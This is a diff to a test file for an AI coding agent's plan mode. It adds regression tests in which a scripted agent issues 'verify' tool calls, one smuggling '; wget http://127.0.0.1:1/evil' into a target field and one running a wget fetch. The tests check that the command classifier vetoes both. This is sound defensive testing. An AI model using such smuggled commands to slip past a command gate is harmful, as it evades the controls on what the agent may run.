@@ -49,6 +49,11 @@ function planModeRepo(): { dir: string; tracked: string } {
   const tracked = join(dir, 'tracked.txt');
   writeFileSync(tracked, 'clean\n');
   writeFileSync(join(dir, '.gitignore'), '.mochi/\n.revtmp/\n');
+  // package.json with a test script: makes `verify {command:'test'}` resolve
+  // to `npm test` in the gate — so the injection test genuinely RED-fails on
+  // pre-fix code (which classified the bare alias and executed the appended
+  // target), instead of vetoing for the wrong reason (unresolvable alias).
+  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 't', scripts: { test: 'echo suite-ran' } }));
   mkdirSync(join(dir, '.mochi'), { recursive: true });
   g(['add', '.']);
   g(['commit', '-q', '-m', 'init']);
@@ -112,6 +117,101 @@ describe('plan-mode verify-with-rollback (B9 restructure)', () => {
       // And the run still finishes as a plan (no veto-escalation forced stop).
       expect(result.summary).toContain('PLAN');
       expect(result.success).toBe(true);
+    } finally {
+      try { await fake?.close(); } catch { /* best-effort */ }
+    }
+  });
+
+  it('vetoes a verify whose target smuggles shell metachars past the classifier (review P1: target injection)', async () => {
+    const { dir, tracked } = planModeRepo();
+    let fake: Awaited<ReturnType<typeof startFakeOpenAI>> | undefined;
+    try {
+      // The classifier now sees `npm test -- x; wget evil` (NETWORK class →
+      // veto). RED on the pre-fix code: the gate classified only `npm test`
+      // (low), the injected `wget` ran. A hit counter would show 1 pre-fix,
+      // 0 post-fix.
+      fake = await startFakeOpenAI([
+        {
+          content: 'Running targeted tests.',
+          toolCalls: [{
+            id: 'v2',
+            type: 'function',
+            function: { name: 'verify', arguments: JSON.stringify({ command: 'test', target: 'x; wget http://127.0.0.1:1/evil' }) },
+          }],
+          finishReason: 'tool_calls',
+        },
+        { content: 'PLAN:\n1. adjusted after failed check', finishReason: 'stop' },
+      ]);
+      const config = makeConfig(dir, fake.url);
+      const workspace = new Workspace(dir, '.mochi');
+      workspace.ensure();
+      const context = new ContextEngine(config, dir);
+      context.setGoal('plan a change');
+      const task = createTask('Plan only', 'Produce a plan. No changes.');
+      const agent = new Agent({
+        id: 'b9-plan-verify-inject',
+        role: 'coder',
+        config,
+        workspace,
+        events: new EventBus(),
+        cwd: dir,
+        context,
+        planMode: true,
+      });
+      await agent.run(task);
+      const verifyMsg = context.getMessages().find((m) => m.role === 'tool' && (m as { name?: string }).name === 'verify');
+      // The tool response must be the plan-mode veto, not an execution.
+      expect(verifyMsg).toBeDefined();
+      expect(String(verifyMsg?.content)).toContain('plan mode');
+      expect(String(verifyMsg?.content)).not.toContain('[PASS]');
+      // The tree was never touched by an injected command.
+      expect(readFileSync(tracked, 'utf8')).toBe('clean\n');
+    } finally {
+      try { await fake?.close(); } catch { /* best-effort */ }
+    }
+  });
+
+  it('vetoes a network-classified verbatim verify command in plan mode (review P1: network gate gap)', async () => {
+    const { dir, tracked } = planModeRepo();
+    let fake: Awaited<ReturnType<typeof startFakeOpenAI>> | undefined;
+    try {
+      // `wget ...` is NETWORK-classified: pre-fix it ran in plan mode (only
+      // 'destructive' was excluded); post-fix it is vetoed.
+      fake = await startFakeOpenAI([
+        {
+          content: 'Fetching data.',
+          toolCalls: [{
+            id: 'v3',
+            type: 'function',
+            function: { name: 'verify', arguments: JSON.stringify({ command: 'wget -q -O out.txt http://127.0.0.1:1/x' }) },
+          }],
+          finishReason: 'tool_calls',
+        },
+        { content: 'PLAN:\n1. done', finishReason: 'stop' },
+      ]);
+      const config = makeConfig(dir, fake.url);
+      const workspace = new Workspace(dir, '.mochi');
+      workspace.ensure();
+      const context = new ContextEngine(config, dir);
+      context.setGoal('plan a change');
+      const task = createTask('Plan only', 'Produce a plan. No changes.');
+      const agent = new Agent({
+        id: 'b9-plan-verify-net',
+        role: 'coder',
+        config,
+        workspace,
+        events: new EventBus(),
+        cwd: dir,
+        context,
+        planMode: true,
+      });
+      await agent.run(task);
+      const verifyMsg = context.getMessages().find((m) => m.role === 'tool' && (m as { name?: string }).name === 'verify');
+      expect(verifyMsg).toBeDefined();
+      expect(String(verifyMsg?.content)).toContain('plan mode');
+      expect(String(verifyMsg?.content)).not.toContain('[PASS]');
+      // No artifact landed in the tree.
+      expect(readFileSync(tracked, 'utf8')).toBe('clean\n');
     } finally {
       try { await fake?.close(); } catch { /* best-effort */ }
     }
